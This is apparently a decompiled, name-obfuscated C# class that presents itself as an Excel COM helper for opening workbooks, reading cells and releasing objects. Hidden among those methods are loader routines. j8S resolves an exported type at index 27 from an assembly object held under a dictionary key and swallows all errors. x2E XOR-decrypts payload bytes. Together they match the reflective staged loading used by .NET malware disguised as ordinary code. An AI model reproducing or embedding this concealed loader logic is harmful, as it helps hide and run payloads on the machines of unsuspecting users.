using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Jq1;
using Microsoft.VisualBasic.CompilerServices;
using Yp0k;
using a1X;
using j5Y;
using n7M;

namespace Rx0e;

public class Yc4g
{
	private i3C _oXls;

	private Sp7 _oWBook;

	private g3T _oSheet;

	public i3C OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public Sp7 OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public g3T OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public Yc4g()
	{
		_oXls = (i3C)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void Ys6(string Tb4, bool Xr7)
	{
		OWBook = OXls.Workbooks.Open(Tb4, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = Xr7;
	}

	internal static bool j8S()
	{
		try
		{
			try
			{
				Type type = (Type)w6R(RuntimeHelpers.GetObjectValue(Yz15.mDic["Deep"]));
				if (Operators.CompareString(type.Name, Yz15.mDic[Yz15.tName].ToString(), false) == 0)
				{
					Yz15.mDic.Add(Yz15.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void Fk3(string c9N)
	{
		OSheet = (g3T)OWBook.Sheets[c9N];
	}

	public Qr6 a5L(int Fz7, int Zj3)
	{
		return (Qr6)OSheet.Cells[Fz7, Zj3];
	}

	public void n6H(bool Ei8)
	{
		if (OWBook != null)
		{
			OWBook.Close(Ei8, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		i3C Lf = OXls;
		Zz7(ref Lf);
		OXls = Lf;
	}

	internal static byte x2E(byte r4G, byte[] d3N, int a6L, int o2N)
	{
		r4G = (byte)(r4G ^ checked((byte)(d3N[unchecked(o2N % d3N.Length)] ^ ((o2N + unchecked(a6L % d3N.Length)) & a6L))));
		return r4G;
	}

	private static void Zz7<Ng9>(ref Ng9 Lf2, bool Yz3 = false) where Ng9 : class
	{
		if (Lf2 == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(Lf2))
			{
				if (Yz3)
				{
					Marshal.FinalReleaseComObject(Lf2);
				}
				else
				{
					Marshal.ReleaseComObject(Lf2);
				}
			}
		}
		finally
		{
			Lf2 = null;
		}
	}

	internal static object w6R(object Qx2)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(Qx2, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
